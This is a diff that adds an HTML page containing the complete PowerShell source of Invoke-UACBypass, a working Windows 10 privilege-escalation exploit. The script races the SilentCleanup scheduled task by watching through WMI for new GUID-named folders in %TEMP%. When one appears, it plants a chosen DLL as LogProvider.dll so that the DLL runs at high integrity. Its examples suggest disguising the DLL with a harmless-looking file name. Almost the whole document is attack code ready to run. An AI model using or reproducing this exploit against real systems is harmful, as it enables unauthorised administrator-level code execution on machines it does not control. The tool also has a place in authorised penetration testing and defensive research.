@@ -1,0 +1,131 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Invoke-UACBypass</title>
+</head><body>function Invoke-UACBypass {<br/>
+&lt;#<br/>
+.SYNOPSIS<br/>
+<br/>
+Bypasses UAC on Windows 10 by abusing the SilentCleanup task to win a race condition, allowing for a DLL hijack without a privileged file copy.<br/>
+<br/>
+Author: Matthew Graeber (@mattifestation), Matt Nelson (@enigma0x3)<br/>
+License: BSD 3-Clause<br/>
+Required Dependencies: None<br/>
+Optional Dependencies: None<br/>
+<br/>
+.PARAMETER DllPath<br/>
+<br/>
+Specifies the path to the DLL you want executed in a high integrity context. Be mindful of the architecture of the DLL. It must match that of %SystemRoot%\System32\Dism\LogProvider.dll.<br/>
+<br/>
+.EXAMPLE<br/>
+<br/>
+Invoke-UACBypass -DllPath C:\Users\TestUser\Desktop\Win10UACBypass\PrivescTest.dll<br/>
+<br/>
+.EXAMPLE<br/>
+<br/>
+Invoke-UACBypass -DllPath C:\Users\TestUser\Desktop\TotallyLegit.txt -Verbose<br/>
+<br/>
+The DllPath can have any extension as long as the file itself is a DLL.<br/>
+#&gt;<br/>
+<br/>
+  [CmdletBinding()]<br/>
+  [OutputType([System.IO.FileInfo])]<br/>
+  Param (<br/>
+    [Parameter(Mandatory = $True)]<br/>
+    [String]<br/>
+    [ValidateScript({ Test-Path $_ })]<br/>
+    $DllPath<br/>
+  )<br/>
+<br/>
+  $PrivescAction = {<br/>
+    $ReplacementDllPath = $Event.MessageData.DllPath<br/>
+    # The newly created GUID folder<br/>
+    $DismHostFolder = $EventArgs.NewEvent.TargetInstance.Name<br/>
+    <br/>
+    $OriginalPreference = $VerbosePreference<br/>
+<br/>
+    # Force -Verbose to display in the event<br/>
+    if ($Event.MessageData.VerboseSet -eq $True) {<br/>
+      $VerbosePreference = 'Continue'<br/>
+    }<br/>
+<br/>
+    Write-Verbose &quot;DismHost folder created in $DismHostFolder&quot;<br/>
+    Write-Verbose &quot;$ReplacementDllPath to $DismHostFolder\LogProvider.dll&quot;<br/>
+      <br/>
+    try {<br/>
+      $FileInfo = Copy-Item -Path $ReplacementDllPath -Destination &quot;$DismHostFolder\LogProvider.dll&quot; -Force -PassThru -ErrorAction Stop<br/>
+    } catch {<br/>
+      Write-Warning &quot;Error copying file! Message: $_&quot;<br/>
+    }<br/>
+<br/>
+    # Restore the event preference<br/>
+    $VerbosePreference = $OriginalPreference<br/>
+<br/>
+    if ($FileInfo) {<br/>
+      # Trigger Wait-Event to return and indicate success.<br/>
+      New-Event -SourceIdentifier 'DllPlantedSuccess' -MessageData $FileInfo<br/>
+    }<br/>
+  }<br/>
+<br/>
+  $VerboseSet = $False<br/>
+  if ($PSBoundParameters['Verbose']) { $VerboseSet = $True }<br/>
+<br/>
+  $MessageData = New-Object -TypeName PSObject -Property @{<br/>
+    DllPath = $DllPath<br/>
+    VerboseSet = $VerboseSet # Pass the verbose preference to the scriptblock since<br/>
+                # event scriptblocks will not automatically honor -Verbose.<br/>
+  }<br/>
+<br/>
+  $TempDrive = $Env:TEMP.Substring(0,2)<br/>
+<br/>
+  # Trigger the DLL dropper with the following conditions:<br/>
+  # 1) A directory is created - i.e. new Win32_Directory instance<br/>
+  # 2) The directory created is created under %TEMP%<br/>
+  # 3) The directory name is in the form of a GUID<br/>
+  $TempFolderCreationEvent = &quot;SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA `&quot;Win32_Directory`&quot; AND TargetInstance.Drive = `&quot;$TempDrive`&quot; AND TargetInstance.Path = `&quot;$($Env:TEMP.Substring(2).Replace('\', '\\'))\\`&quot; AND TargetInstance.FileName LIKE `&quot;________-____-____-____-____________`&quot;&quot;<br/>
+  <br/>
+  $TempFolderWatcher = Register-WmiEvent -Query $TempFolderCreationEvent -Action $PrivescAction -MessageData $MessageData<br/>
+<br/>
+  # We need to jump through these hoops to properly capture stdout and stderr of schtasks.<br/>
+  $StartInfo = New-Object Diagnostics.ProcessStartInfo<br/>
+  $StartInfo.FileName = 'schtasks'<br/>
+  $StartInfo.Arguments = '/Run /TN &quot;\Microsoft\Windows\DiskCleanup\SilentCleanup&quot; /I'<br/>
+  $StartInfo.RedirectStandardError = $True<br/>
+  $StartInfo.RedirectStandardOutput = $True<br/>
+  $StartInfo.UseShellExecute = $False<br/>
+  $Process = New-Object Diagnostics.Process<br/>
+  $Process.StartInfo = $StartInfo<br/>
+  $null = $Process.Start()<br/>
+  $Process.WaitForExit()<br/>
+  $Stdout = $Process.StandardOutput.ReadToEnd().Trim()<br/>
+  $Stderr = $Process.StandardError.ReadToEnd().Trim()<br/>
+<br/>
+  if ($Stderr) {<br/>
+    Unregister-Event -SubscriptionId $TempFolderWatcher.Id<br/>
+    throw &quot;SilentCleanup task failed to execute. Error message: $Stderr&quot;<br/>
+  } else {<br/>
+    if ($Stdout.Contains('is currently running')) {<br/>
+      Unregister-Event -SubscriptionId $TempFolderWatcher.Id<br/>
+      Write-Warning 'SilentCleanup task is already running. Please wait until the task has completed.'<br/>
+    }<br/>
+<br/>
+    Write-Verbose &quot;SilentCleanup task executed successfully. Message: $Stdout&quot;<br/>
+  }<br/>
+<br/>
+  $PayloadExecutedEvent = Wait-Event -SourceIdentifier 'DllPlantedSuccess' -Timeout 10<br/>
+<br/>
+  Unregister-Event -SubscriptionId $TempFolderWatcher.Id<br/>
+<br/>
+  if ($PayloadExecutedEvent) {<br/>
+    Write-Verbose 'UAC bypass was successful!'<br/>
+<br/>
+    # Output the file info for the DLL that was planted<br/>
+    $PayloadExecutedEvent.MessageData<br/>
+<br/>
+    $PayloadExecutedEvent | Remove-Event<br/>
+  } else {<br/>
+    # The event timed out.<br/>
+    Write-Error 'UAC bypass failed. The DLL was not planted in its target.'<br/>
+  }<br/>
+}<br/>
+</body></html>
